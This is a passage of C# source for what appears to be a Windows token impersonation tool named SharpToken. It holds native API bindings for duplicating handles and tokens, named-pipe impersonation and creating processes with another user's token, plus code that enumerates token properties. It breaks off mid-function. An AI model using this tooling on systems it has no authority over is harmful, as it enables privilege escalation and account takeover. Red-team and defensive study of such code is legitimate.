﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using static System.Management.ManagementObjectCollection;

namespace SharpToken
{

    public enum IntegrityLevel : uint
    {
        Untrusted,
        LowIntegrity = 0x00001000,
        MediumIntegrity = 0x00002000,
        MediumHighIntegrity = 0x100 + MediumIntegrity,
        HighIntegrity = 0X00003000,
        SystemIntegrity = 0x00004000,
        ProtectedProcess = 0x00005000
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_ACCESS_TOKEN
    {
        public IntPtr Token;
        public IntPtr Thread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public bool bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL
    {

        public SID_AND_ATTRIBUTES Label;

    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct TOKEN_GROUPS
    {
        public uint GroupCount;

        public SID_AND_ATTRIBUTES Groups;
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public uint Attributes;
    }


    [Flags]
    public enum ProcessCreateFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }

    public enum PROCESS_INFORMATION_CLASS
    {
        ProcessBasicInformation,
        ProcessQuotaLimits,
        ProcessIoCounters,
        ProcessVmCounters,
        ProcessTimes,
        ProcessBasePriority,
        ProcessRaisePriority,
        ProcessDebugPort,
        ProcessExceptionPort,
        ProcessAccessToken,
        ProcessLdtInformation,
        ProcessLdtSize,
        ProcessDefaultHardErrorMode,
        ProcessIoPortHandlers,
        ProcessPooledUsageAndLimits,
        ProcessWorkingSetWatch,
        ProcessUserModeIOPL,
        ProcessEnableAlignmentFaultFixup,
        ProcessPriorityClass,
        ProcessWx86Information,
        ProcessHandleCount,
        ProcessAffinityMask,
        ProcessPriorityBoost,
        MaxProcessInfoClass


    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }
    public enum TOKEN_ELEVATION_TYPE
    {
        TokenElevationTypeDefault = 1,
        TokenElevationTypeFull,
        TokenElevationTypeLimited
    }
    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,
        TokenIsAppContainer,
        TokenCapabilities,
        TokenAppContainerSid,
        TokenAppContainerNumber,
        TokenUserClaimAttributes,
        TokenDeviceClaimAttributes,
        TokenRestrictedUserClaimAttributes,
        TokenRestrictedDeviceClaimAttributes,
        TokenDeviceGroups,
        TokenRestrictedDeviceGroups,
        TokenSecurityAttributes,
        TokenIsRestricted,
        TokenProcessTrustLevel,
        TokenPrivateNameSpace,
        TokenSingletonAttributes,
        TokenBnoIsolation,
        TokenChildProcessFlags,
        TokenIsLessPrivilegedAppContainer,
        TokenIsSandboxed,
        MaxTokenInfoClass
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public int LowPart;

        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class TokenPrivileges
    {
        public int PrivilegeCount = 1;

        public LUID Luid;

        public int Attributes;
    }
    public enum SECURITY_LOGON_TYPE : uint
    {
        UndefinedLogonType = 0,
        Interactive = 2,
        Network,
        Batch,
        Service,
        Proxy,
        Unlock,
        NetworkCleartext,
        NewCredentials,
        RemoteInteractive,
        CachedInteractive,
        CachedRemoteInteractive,
        CachedUnlock
    }
    public enum TOKEN_TYPE
    {
        UnKnown = -1,
        TokenPrimary = 1,
        TokenImpersonation
    }
    public enum OBJECT_INFORMATION_CLASS
    {
        ObjectBasicInformation,
        ObjectNameInformation,
        ObjectTypeInformation,
        ObjectAllTypesInformation,
        ObjectHandleInformation
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_TYPE_INFORMATION
    { // Information Class 2
        public UNICODE_STRING Name;
        public int ObjectCount;
        public int HandleCount;
        public int Reserved1;
        public int Reserved2;
        public int Reserved3;
        public int Reserved4;
        public int PeakObjectCount;
        public int PeakHandleCount;
        public int Reserved5;
        public int Reserved6;
        public int Reserved7;
        public int Reserved8;
        public int InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public int ValidAccess;
        public byte Unknown;
        public byte MaintainHandleDatabase;
        public int PoolType;
        public int PagedPoolUsage;
        public int NonPagedPoolUsage;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SECURITY_LOGON_SESSION_DATA
    {
        public uint Size;

        public LUID LogonId;

        public UNICODE_STRING UserName;

        public UNICODE_STRING LogonDomain;

        public UNICODE_STRING AuthenticationPackage;

        public uint LogonType;

        public uint Session;

        public IntPtr Sid;

        public long LogonTime;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct GENERIC_MAPPING
    {
        public int GenericRead;
        public int GenericWrite;
        public int GenericExecute;
        public int GenericAll;
    }
    public class NativeMethod
    {
        public static readonly uint HANDLE_FLAG_INHERIT = 0x00000001;
        public static readonly uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;
        public static readonly uint SystemExtendedHandleInformation = 0x40;
        public static readonly uint STATUS_SUCCESS = 0x00000000;
        public static readonly uint ERROR_SUCCESS = 0x00000000;
        public static readonly uint STATUS_INFO_LENGTH_MISMATCH = 0xc0000004;
        public static readonly uint STATUS_BUFFER_OVERFLOW = 0x80000005;
        public static readonly uint DUPLICATE_SAME_ACCESS = 0x00000002;
        public static readonly uint MAXIMUM_ALLOWED = 0x02000000;
        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public static uint TOKEN_DUPLICATE = 0x0002;
        public static uint TOKEN_IMPERSONATE = 0x0004;
        public static uint TOKEN_QUERY = 0x0008;
        public static uint TOKEN_QUERY_SOURCE = 0x0010;
        public static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public static uint TOKEN_ADJUST_GROUPS = 0x0040;
        public static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        public static uint TOKEN_ADJUST_SESSIONID = 0x0100;

        public static uint STARTF_FORCEONFEEDBACK = 0x00000040;
        public static uint STARTF_FORCEOFFFEEDBACK = 0x00000080;
        public static uint STARTF_PREVENTPINNING = 0x00002000;
        public static uint STARTF_RUNFULLSCREEN = 0x00000020;
        public static uint STARTF_TITLEISAPPID = 0x00001000;
        public static uint STARTF_TITLEISLINKNAME = 0x00000800;
        public static uint STARTF_UNTRUSTEDSOURCE = 0x00008000;
        public static uint STARTF_USECOUNTCHARS = 0x00000008;
        public static uint STARTF_USEFILLATTRIBUTE = 0x00000010;
        public static uint STARTF_USEHOTKEY = 0x00000200;
        public static uint STARTF_USEPOSITION = 0x00000004;
        public static uint STARTF_USESHOWWINDOW = 0x00000001;
        public static uint STARTF_USESIZE = 0x00000002;
        public static uint STARTF_USESTDHANDLES = 0x00000100;
        
        
        
        public static uint GENERIC_READ = 0x80000000;
        public static uint GENERIC_WRITE = 0x40000000;
        public static uint GENERIC_EXECUTE = 0x20000000;
        public static uint GENERIC_ALL = 0x10000000;





        public static uint TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        public static uint TOKEN_ALL_ACCESS_P = STANDARD_RIGHTS_REQUIRED |
                          TOKEN_ASSIGN_PRIMARY |
                          TOKEN_DUPLICATE |
                          TOKEN_IMPERSONATE |
                          TOKEN_QUERY |
                          TOKEN_QUERY_SOURCE |
                          TOKEN_ADJUST_PRIVILEGES |
                          TOKEN_ADJUST_GROUPS |
                          TOKEN_ADJUST_DEFAULT;


        public static readonly int SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
        public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;
        public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;

        public static readonly int NMPWAIT_WAIT_FOREVER = unchecked((int)0xffffffff);
        public static readonly int NMPWAIT_NOWAIT = 0x00000001;
        public static readonly int NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

        public static readonly int PIPE_UNLIMITED_INSTANCES = 255;

        public static readonly int PIPE_WAIT = 0x00000000;
        public static readonly int PIPE_NOWAIT = 0x00000001;
        public static readonly int PIPE_READMODE_BYTE = 0x00000000;
        public static readonly int PIPE_READMODE_MESSAGE = 0x00000002;
        public static readonly int PIPE_TYPE_BYTE = 0x00000000;
        public static readonly int PIPE_TYPE_MESSAGE = 0x00000004;
        public static readonly int PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000;
        public static readonly int PIPE_REJECT_REMOTE_CLIENTS = 0x00000008;

        public static readonly int PIPE_ACCESS_INBOUND = 0x00000001;
        public static readonly int PIPE_ACCESS_OUTBOUND = 0x00000002;
        public static readonly int PIPE_ACCESS_DUPLEX = 0x00000003;

        public static IntPtr ContextToken = IntPtr.Zero;

        public static IntPtr BAD_HANLE = new IntPtr(-1);

        [DllImport("ntdll")]
        public static extern uint NtQuerySystemInformation(
        [In] uint SystemInformationClass,
        [In] IntPtr SystemInformation,
        [In] uint SystemInformationLength,
        [Out] out uint ReturnLength);
        [DllImport("ntdll")]
        public static extern uint NtDuplicateObject(
        [In] IntPtr SourceProcessHandle,
        [In] IntPtr SourceHandle,
        [In] IntPtr TargetProcessHandle,
        [In] IntPtr PHANDLE,
        [In] int DesiredAccess,
        [In] int Attributes,
        [In] int Options);

        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtQueryObject(
        [In] IntPtr Handle,
        [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
        IntPtr ObjectInformation,
        [In] int ObjectInformationLength,
        out int ReturnLength);
        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtSuspendProcess([In] IntPtr Handle);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern uint NtResumeProcess(IntPtr ProcessHandle);

        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtTerminateProcess(
  [In] IntPtr ProcessHandle,
  [In] uint ExitStatus);



        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtSetInformationProcess(

  [In] IntPtr ProcessHandle,
  [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,
  [In] IntPtr ProcessInformation,
  [In] uint ProcessInformationLength);

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [DllImport("secur32.dll", SetLastError = true)]
        internal static extern int LsaFreeReturnBuffer(IntPtr handle);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool PeekNamedPipe(IntPtr handle,
            byte[] buffer, uint nBufferSize, ref uint bytesRead,
            ref uint bytesAvail, ref uint BytesLeftThisMessage);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsTokenRestricted(IntPtr TokenHandle);
        [DllImport("kernel32")]
        public static extern void CloseHandle(IntPtr hObject);
        [DllImport("kernel32")]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        public static extern void SetLastError(uint dwErrCode);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessW([In] string lpApplicationName, [In][Out] string lpCommandLine, [In] IntPtr lpProcessAttributes, [In] IntPtr lpThreadAttributes, [In] bool bInheritHandles, [In] uint dwCreationFlags, [In] IntPtr lpEnvironment, [In] string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, [Out] out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
        [DllImport("Kernel32", SetLastError = true)]
        public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);

        [DllImport("wtsapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);

        [DllImport("kernel32.dll")]
        public static extern int WTSGetActiveConsoleSessionId();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
        ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(
  [In] IntPtr hSourceProcessHandle,
  [In] IntPtr hSourceHandle,
  [In] IntPtr hTargetProcessHandle,
  out IntPtr lpTargetHandle,
  [In] uint dwDesiredAccess,
  [In] bool bInheritHandle,
  [In] uint dwOptions
);
        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern uint LsaGetLogonSessionData([In] ref LUID LogonId, [In][Out] ref IntPtr ppLogonSessionData);
        [DllImport("advapi32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool LookupPrivilegeValue([MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, [MarshalAs(UnmanagedType.LPTStr)] string lpName, out LUID lpLuid);
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, TokenPrivileges NewState, int BufferLength, IntPtr PreviousState, out int ReturnLength);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        [DllImport("advapi32.dll", SetLastError = true, EntryPoint= "RevertToSelf")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelfEx();
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = "CreateNamedPipeW", SetLastError = true)]
        public static extern IntPtr CreateNamedPipe(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = "CreateFileW", SetLastError = true)]
        public static extern IntPtr CreateFileW(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, ref SECURITY_ATTRIBUTES secAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
        [DllImport("psapi.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetModuleFileNameEx(IntPtr processHandle, IntPtr moduleHandle, StringBuilder baseName, int size);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true,EntryPoint = "DuplicateTokenEx")]
        private extern static bool DuplicateTokenExInternal(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
        public static bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInformationClass, out IntPtr TokenInformation, out uint dwLength)
        {

            bool status = GetTokenInformation(tokenHandle, tokenInformationClass, IntPtr.Zero, 0, out dwLength);

            if (dwLength == 0xfffffff8)
            {
                dwLength = 0;
                goto failRet;
            }

            TokenInformation = Marshal.AllocHGlobal((int)dwLength);
            if (GetTokenInformation(tokenHandle, tokenInformationClass, TokenInformation, dwLength, out dwLength))
            {
                return true;
            }
        failRet:
            dwLength = 0;
            TokenInformation = IntPtr.Zero;
            return false;
        }

        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
            IntPtr lpTokenAttributes, TokenImpersonationLevel impersonationLevel, TOKEN_TYPE TokenType,
            out IntPtr phNewToken)
        {
            impersonationLevel -= TokenImpersonationLevel.Anonymous;
            return DuplicateTokenExInternal(hExistingToken, dwDesiredAccess, lpTokenAttributes, (uint)impersonationLevel,
                 TokenType, out phNewToken);
        }

        public static bool RevertToSelf() {
            bool isOk = RevertToSelfEx();
            if (ContextToken != IntPtr.Zero)
            {
               isOk =  ImpersonateLoggedOnUser(ContextToken);
            }

            return isOk;
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct TOKEN_STATISTICS
    {

        public LUID TokenId;

        public LUID AuthenticationId;

        public long ExpirationTime;

        public uint TokenType;

        public uint ImpersonationLevel;

        public uint DynamicCharged;

        public uint DynamicAvailable;

        public uint GroupCount;

        public uint PrivilegeCount;

        public LUID ModifiedId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct _SYSTEM_HANDLE_INFORMATION_EX
    {
        private static int TypeSize = Marshal.SizeOf(typeof(_SYSTEM_HANDLE_INFORMATION_EX));
        public IntPtr NumberOfHandles;
        public IntPtr Reserved;


        public uint GetNumberOfHandles()
        {
            return (uint)NumberOfHandles.ToInt64();
        }
        public static unsafe SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleAt(IntPtr handleInfoPtr, ulong index)
        {
            IntPtr thisPtr = new IntPtr(handleInfoPtr.ToPointer());
            thisPtr = new IntPtr(thisPtr.ToInt64() + TypeSize + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)) * (int)index);

            return (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(thisPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING : IDisposable
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;

        [SecurityPermission(SecurityAction.LinkDemand)]
        public void Initialize(string s)
        {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)(Length + 2);
            buffer = Marshal.StringToHGlobalUni(s);
        }

        [SecurityPermission(SecurityAction.LinkDemand)]
        public void Dispose()
        {
            Marshal.FreeHGlobal(buffer);
            buffer = IntPtr.Zero;
        }
        [SecurityPermission(SecurityAction.LinkDemand)]
        public override string ToString()
        {
            if (Length == 0)
                return String.Empty;
            return Marshal.PtrToStringUni(buffer, Length / 2);
        }
    }

    public class ProcessToken
    {
        public string SID { get; set; }
        public string LogonDomain { get; set; }
        public string UserName { get; set; }
        public uint Session { get; set; }
        public SECURITY_LOGON_TYPE LogonType { get; set; }
        public TOKEN_TYPE TokenType { get; set; }
        public IntPtr TokenHandle { get; set; }
        public int TargetProcessId { get; set; }
        public IntPtr TargetProcessToken { get; set; }
        public TokenImpersonationLevel ImpersonationLevel { get; set; }
        public string AuthenticationType { get; set; }
        public string TargetProcessExePath { get; set; }
        public TOKEN_ELEVATION_TYPE TokenElevationType { get; set; }
        public IntegrityLevel IntegrityLevel { get; set; }
        public bool IsRestricted { get; set; }
        public bool TokenUIAccess { get; set; }

        public string Groups { get; set; }

        public bool IsClose { get; private set; }

        private ProcessToken()
        {

        }


        public static ProcessToken Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)
        {
            try
            {
                return _Cast(targetProcessToken, targetProcessPid, targetProcessHandle, tokenHandle);
            }
            catch (Exception)
            {

                return null;
            }

        }
        private static ProcessToken _Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)
        {
            ProcessToken processToken = new ProcessToken();
            SecurityIdentifier securityIdentifier = GetUser(tokenHandle);

            if (securityIdentifier == null)
            {
                return null;
            }

            processToken.UserName = securityIdentifier.Translate(typeof(NTAccount)).Value;
            processToken.SID = securityIdentifier.Value;
            processToken.Groups = string.Join(",", getGoups(tokenHandle));
            processToken.ImpersonationLevel = GetImpersonationLevel(tokenHandle);
            uint session = 0;
            SECURITY_LOGON_TYPE logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;
            string logonDomain = "";

            processToken.AuthenticationType = GetAuthenticationType(tokenHandle, out session, out logonDomain, out logonType);
            processToken.Session = session;
            processToken.LogonType = logonType;
            processToken.LogonDomain = logonDomain;

            processToken.TargetProcessId = targetProcessPid;
            processToken.TargetProcessToken = targetProcessToken;

            //Get Token Type
            processToken.TokenType = GetTokenType(tokenHandle);

            //Check whether the token type is the main Token. If it is the main Token, you must call DuplicateTokenEx to obtain the simulated Token. Otherwise, you will not be able to obtain the Token type. Details: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class
            if (processToken.ImpersonationLevel == TokenImpersonationLevel.None)
            {
                IntPtr newToken;
                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,
                        TokenImpersonationLevel.Delegation, TOKEN_TYPE.TokenImpersonation, out newToken))
                {
                    processToken.ImpersonationLevel = TokenImpersonationLevel.Delegation;
                    NativeMethod.CloseHandle(newToken);
                }
                else if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,
                    TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenImpersonation, out newToken))
                {
                    processToken.ImpersonationLevel = TokenImpersonationLevel.Impersonation;
                    NativeMethod.CloseHandle(newToken);
                }
            }

            processToken.TokenElevationType = GetTokenElevationType(tokenHandle);
            processToken.IntegrityLevel = GetTokenIntegrityLevel(tokenHandle);
            processToken.IsRestricted = NativeMethod.IsTokenRestricted(tokenHandle);
            processToken.TokenUIAccess = GetTokenUIAccess(tokenHandle);
            if (targetProcessHandle != IntPtr.Zero)
            {
                StringBuilder exePath = new StringBuilder(1024);
                NativeMethod.GetModuleFileNameEx(targetProcessHandle, IntPtr.Zero, exePath, exePath.Capacity * 2);
                processToken.TargetProcessExePath = exePath.ToString();
            }

            processToken.TokenHandle = tokenHandle;
            return processToken;
        }

        public static SecurityIdentifier GetUser(IntPtr tokenHandle)
        {
            uint ReturnLength;
            IntPtr tokenUserPtr = IntPtr.Zero;
            SecurityIdentifier securityIdentifier = null;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUser, out tokenUserPtr, out ReturnLength))
            {
                securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(tokenUserPtr));
                Marshal.FreeHGlobal(tokenUserPtr);
            }
            return securityIdentifier;
        }

        public static string[] getGoups(IntPtr tokenHandle)
        {
            List<string> goups = new List<string>();
            IntPtr tokenUserPtr = IntPtr.Zero;
            SecurityIdentifier securityIdentifier = null;
            uint ReturnLength;
            /**
             *
             * typedef struct _TOKEN_GROUPS {
                DWORD GroupCount;
            #ifdef MIDL_PASS
                [size_is(GroupCount)] SID_AND_ATTRIBUTES Groups[*];
            #else // MIDL_PASS
                SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];
            #endif // MIDL_PASS
            } TOKEN_GROUPS, *PTOKEN_GROUPS;
             *
             */
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenGroups, out tokenUserPtr, out ReturnLength))
            {
                int offset = 0;
                int groupCount = Marshal.ReadInt32(tokenUserPtr);
                offset += Marshal.SizeOf(typeof(TOKEN_GROUPS)) - Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));

                for (int i = 0; i < groupCount; i++)
                {
                    try
                    {
                        securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(new IntPtr(tokenUserPtr.ToInt64() + offset)));
                        offset += Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));
                        goups.Add(securityIdentifier.Translate(typeof(NTAccount)).Value);
                    }
                    catch (Exception e)
                    {
                        continue;
                    }
                }
                Marshal.FreeHGlobal(tokenUserPtr);
            }
            return goups.ToArray();
        }

        public static TOKEN_TYPE GetTokenType(IntPtr tokenHandle)
        {
            IntPtr tokenTypePtr = IntPtr.Zero;
            uint outLength = 0;
            TOKEN_TYPE ret = TOKEN_TYPE.UnKnown;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenType, out tokenTypePtr, out outLength))
            {
                ret = (TOKEN_TYPE)(int)Marshal.PtrToStructure(tokenTypePtr, typeof(int));
                Marshal.FreeHGlobal(tokenTypePtr);
            }
            return ret;
        }
        public static TOKEN_ELEVATION_TYPE GetTokenElevationType(IntPtr tokenHandle)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint dwLength;
            int num = -1;
